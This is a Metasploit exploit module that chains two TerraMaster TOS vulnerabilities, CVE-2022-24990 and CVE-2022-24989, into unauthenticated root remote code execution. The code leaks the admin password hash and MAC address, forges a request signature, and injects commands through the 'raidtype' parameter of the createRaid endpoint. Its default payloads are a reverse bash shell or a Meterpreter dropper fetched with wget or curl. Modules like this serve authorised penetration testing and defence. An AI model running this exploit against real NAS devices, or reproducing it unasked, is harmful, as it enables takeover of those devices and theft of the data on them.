##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'digest/md5'
require 'time'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
  include Msf::Exploit::FileDropper
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'TerraMaster TOS 4.2.29 or lower - Unauthenticated RCE chaining CVE-2022-24990 and CVE-2022-24989',
        'Description' => %q{
          This module exploits an unauthenticated remote code execution vulnerability in TerraMaster TOS 4.2.29
          and lower by chaining two existing vulnerabilities, CVE-2022-24990 "Leaking sensitive information"
          and CVE-2022-24989, "Authenticated remote code execution".
          Exploiting vulnerable endpoint `api.php?mobile/webNasIPS` leaking sensitive information such as admin password
          hash and mac address, the attacker can achieve unauthenticated access and use another vulnerable endpoint
          `api.php?mobile/createRaid` with POST parameters `raidtype` and `diskstring` to execute remote code as root
          on TerraMaster NAS devices.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die-gr3y <h00die.gr3y[at]gmail.com>', # MSF module contributor
          'Octagon Networks', # Discovery
          '0xf4n9x' # POC
        ],
        'References' => [
          ['CVE', '2022-24990'],
          ['CVE', '2022-24989'],
          ['URL', 'https://octagon.net/blog/2022/03/07/cve-2022-24990-terrmaster-tos-unauthenticated-remote-command-execution-via-php-object-instantiation/'],
          ['URL', 'https://github.com/0xf4n9x/CVE-2022-24990'],
          ['URL', 'https://attackerkb.com/topics/h8YKVKx21t/cve-2022-24990']
        ],
        'DisclosureDate' => '2022-03-07',
        'Platform' => ['unix', 'linux'],
        'Arch' => [ARCH_CMD, ARCH_X64, ARCH_X86, ARCH_AARCH64],
        'Privileged' => true,
        'Targets' => [
          [
            'Unix Command',
            {
              'Platform' => 'unix',
              'Arch' => ARCH_CMD,
              'Type' => :unix_cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/unix/reverse_bash'
              }
            }
          ],
          [
            'Linux Dropper',
            {
              'Platform' => 'linux',
              'Arch' => [ARCH_X64, ARCH_X86, ARCH_AARCH64],
              'Type' => :linux_dropper,
              'CmdStagerFlavor' => ['bourne', 'wget', 'curl'],
              'DefaultOptions' => {
                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp'
              }
            }
          ]
        ],
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'RPORT' => 8181,
          'SSL' => false
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )
    register_options([
      OptString.new('TARGETURI', [true, 'Path to Terramaster Web console', '/'])
    ])
  end

  def get_data
    # Initialise variable data to store the leaked data
    @data = {}

    # Get the data by exploiting the LFI vulnerability through vulnerable endpoint `api.php?mobile/webNasIPS`
    # CVE-2022-24990
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'module', 'api.php?mobile/webNasIPS'),
      'headers' => {
        'User-Agent' => 'TNAS'
      }
    })
    if res && res.code == 200 && res.body.include?('webNasIPS successful')
      # Parse the JSON response and get the data such as admin password hash and MAC address
      res_json = res.get_json_document
      unless res_json.blank?
        @data['password'] = res_json['data'].split('PWD:')[1].split('SAT')[0].strip
        @data['mac'] = res_json['data'].split('mac":"')[1].split('"')[0].tr(':', '').strip
        @data['key'] = @data['mac'][6..11] # last three MAC address entries
        @data['timestamp'] = Time.new.to_i.to_s
        # derive signature
        @data['signature'] = tos_encrypt_str(@data['key'], @data['timestamp'])
      end
    end
  end

  def tos_encrypt_str(key, str_to_encrypt)
    id = key + str_to_encrypt
    return Digest::MD5.hexdigest(id.encode('utf-8'))
  end

  def execute_command(cmd, _opts = {})
    # Execute RCE using vulnerable endpoint `api.php?mobile/createRaid`
    # CVE-2022-24989
    diskstring = Rex::Text.rand_text_alpha_upper(4..8)

    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'module', 'api.php?mobile/createRaid'),
      'ctype' => 'application/x-www-form-urlencoded',
      'headers' => {
        'User-Agent' => 'TNAS',
        'Authorization' => @data['password'],
        'Signature' => @data['signature'],
        'Timestamp' => @data['timestamp']
      },
      'vars_post' => {
        'raidtype' => ';' + cmd,
        'diskstring' => diskstring.to_s
      }
    })
  end

  def get_terramaster_info
    # get Terramaster CPU architecture (X64 or ARM64) and TOS version
    @terramaster = {}
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'tos', 'index.php?user/login')
    })

    if res && res.body && res.code == 200
      # get the version information from the request response like below:
      # <link href="./static/style/bootstrap.css?ver=TOS3_A1.0_4.2.07" rel="stylesheet"/>
      return if res.body.match(/ver=.+?"/).nil?

      version = res.body.match(/ver=.+?"/)[0]
      # check if architecture is ARM64 or X64
      if version.match(/_A/)
        @terramaster['cpu_arch'] = 'ARM64'
      elsif version.match(/_S/) || version.match(/_Q/)
        @terramaster['cpu_arch'] = 'X64'
      else
        @terramaster['cpu_arch'] = 'UNKNOWN'
      end

      # strip TOS version number and remove trailing double quote.
      @terramaster['tos_version'] = version.split('.0_')[1].chop
    end
  end

  def check
    get_terramaster_info
    return CheckCode::Safe if @terramaster.empty?

    if Rex::Version.new(@terramaster['tos_version']) <= Rex::Version.new('4.2.29')
      return CheckCode::Vulnerable("TOS version is #{@terramaster['tos_version']} and CPU architecture is #{@terramaster['cpu_arch']}.")
    end

    CheckCode::Safe("TOS version is #{@terramaster['tos_version']} and CPU architecture is #{@terramaster['cpu_arch']}.")
  end

  def exploit
    get_data
    fail_with(Failure::BadConfig, 'Can not retrieve the leaked data.') if @data.empty?

    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")
    case target['Type']
    when :unix_cmd
      execute_command(payload.encoded)
    when :linux_dropper
      # Don't check the response here since the server won't respond
      # if the payload is successfully executed.
      execute_cmdstager(linemax: 65536)
    end
  end
end
